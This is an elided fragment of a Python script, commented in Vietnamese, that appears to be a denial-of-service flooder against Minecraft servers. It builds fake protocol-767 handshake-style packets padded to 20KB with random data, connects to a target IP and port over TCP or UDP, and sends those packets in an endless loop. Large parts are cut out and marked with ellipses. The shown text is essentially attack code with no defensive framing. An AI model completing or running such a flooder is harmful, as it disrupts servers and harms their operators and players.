...
DATA_PER_PACKET = 20480         # Kích thước gói tin (20KB)
...
def build_fake_packet(ip, port, protocol_version=767):  # 767 là giao thức cho Minecraft 1.21
    ...
    # Pad with random data to reach DATA_PER_PACKET (20KB)
...
def sender(ip, port, protocol='tcp'):
    ...
    try:
        if protocol == 'tcp':
            ...
            s.connect((ip, port))  # Blocking connect
        else:  # UDP
    ...
    while True:
        for _ in range(PACKET_PER_CONN):
            packet = random.choice(fake_packets)
            try:
                if protocol == 'tcp':
                    s.sendall(packet)
                else:  # UDP
